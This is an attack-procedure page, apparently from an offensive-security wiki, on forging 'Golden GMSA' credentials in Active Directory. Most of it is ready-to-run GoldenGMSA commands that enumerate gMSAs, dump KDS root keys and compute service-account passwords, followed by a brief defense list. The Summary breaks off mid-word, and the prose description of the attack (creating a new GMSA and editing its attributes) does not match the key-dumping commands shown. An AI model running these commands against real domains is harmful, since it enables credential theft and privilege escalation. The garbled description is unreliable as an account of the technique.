---
id: 3be2e98f-e501-423b-8719-eca4c50a72f4
name: Forging Golden GMSA
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:04.628923+00:00'
updated_at: '2023-04-10T20:25:56.688767+00:00'
tags:
- '[[Active Directory Attacks]]'
- '[[Forging Golden GMSA]]'
commands:
- '[[Compute gMSA password - Offline mode]]'
- '[[Compute gMSA password - requires LDAP access]]'
- '[[Compute gMSA password - requires privileged access to the domain]]'
- '[[Dump all KDS Root Keys]]'
- '[[Dump a specific KDS Root Key]]'
- '[[Enumerate all gMSAs]]'
- '[[Query for a specific gMSA]]'
---

# Forging Golden GMSA

## Summary

Forging Golden GMSA is a technique used by attackers to escalate privileges in an Active Directory environment. This technique involves creating a Golden GMSA (Group Managed Service Account) which can be used to authenticate to various services in the domain. This technique can be used to gain acce

## Description

# Description

Forging Golden GMSA is a technique used by attackers to escalate privileges in an Active Directory environment. This technique involves creating a Golden GMSA (Group Managed Service Account) which can be used to authenticate to various services in the domain. This technique can be used to gain access to sensitive data and systems within the domain.

To forge a Golden GMSA, an attacker must have access to the domain controller and be able to create a new GMSA. Once the GMSA is created, the attacker can then modify the attributes of the GMSA to give themselves access to other systems and services within the domain.

From a business perspective, this attack can be devastating as it can give an attacker access to sensitive data and systems within the organization. This can result in data theft, data destruction, and reputational damage for the organization.

 

## Requirements

1. Access to the domain controller.

1. Ability to create a new GMSA.

 

## Defense

1. Limit access to the domain controller to only authorized personnel.

1. Implement strong password policies for all accounts, including service accounts.

1. Monitor for any changes to GMSA attributes or any new GMSAs created.

 

## Objectives

1. Escalate privileges within the Active Directory environment.

1. Gain access to sensitive data and systems within the domain.

 

# Instructions

1. The GoldenGMSA tool can be used to perform the following commands:

 



**Code**: [[# Enumerate all gMSAs
GoldenGMSA.exe gmsainfo
# Qu]]



> 1. `gmsainfo`: Enumerate all gMSAs or query for a specific gMSA using the `--sid` option.
2. `kdsinfo`: Dump all KDS Root Keys or dump a specific KDS Root Key using the `--guid` option.
3. `compute`: Compute gMSA password using the `--sid` option (required) and either the `--kdskey` option (for LDAP access) or the `--pwdid` option (for offline mode).



**Command** ([[Enumerate all gMSAs]]):

```bash
GoldenGMSA.exe gmsainfo
```





**Command** ([[Query for a specific gMSA]]):

```bash
GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
```





**Command** ([[Dump all KDS Root Keys]]):

```bash
GoldenGMSA.exe kdsinfo
```





**Command** ([[Dump a specific KDS Root Key]]):

```bash
GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```





**Command** ([[Compute gMSA password - requires privileged access to the domain]]):

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112
```





**Command** ([[Compute gMSA password - requires LDAP access]]):

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45UZXyuYB[...]G2/M=
```





**Command** ([[Compute gMSA password - Offline mode]]):

```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAALm45U[...]SM0R7djG2/M= --pwdid AQAAA[..]AAA
```



## Commands Used

- [[Compute gMSA password - Offline mode]]
- [[Compute gMSA password - requires LDAP access]]
- [[Compute gMSA password - requires privileged access to the domain]]
- [[Dump all KDS Root Keys]]
- [[Dump a specific KDS Root Key]]
- [[Enumerate all gMSAs]]
- [[Query for a specific gMSA]]

## Tags

- [[Active Directory Attacks]]
- [[Forging Golden GMSA]]


